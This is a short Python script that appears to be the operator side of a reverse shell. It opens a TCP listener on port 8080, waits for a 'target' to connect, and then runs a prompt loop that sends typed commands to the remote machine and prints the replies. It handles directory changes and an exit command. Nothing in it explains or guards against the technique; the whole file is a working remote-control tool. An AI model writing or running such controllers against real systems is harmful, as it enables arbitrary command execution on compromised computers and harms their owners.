import socket

class Server:
    def __init__(self):
        global server
        global address
        global target
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("", 8080))
        server.listen(1)
        
        print("Server Initialized")
        
        target, address = server.accept()
        print(f"Connection Established with {address[0]}")

    def shell(self):
        currentDir = target.recv(1024).decode()  
        
        while True:
            cmd = input("{}#: ".format(currentDir))  
            
            if cmd == "exit()":
                target.send(cmd.encode())  
                break
            
            elif cmd[:2] == "cd":
                target.send(cmd.encode())
                
                currentDir = target.recv(1024).decode()
                
                print(currentDir)
            
            elif cmd == "":
                pass
            
            else:
                target.send(cmd.encode())
                print(target.recv(1024).decode())

server_instance = Server()
server_instance.shell()

server.close()
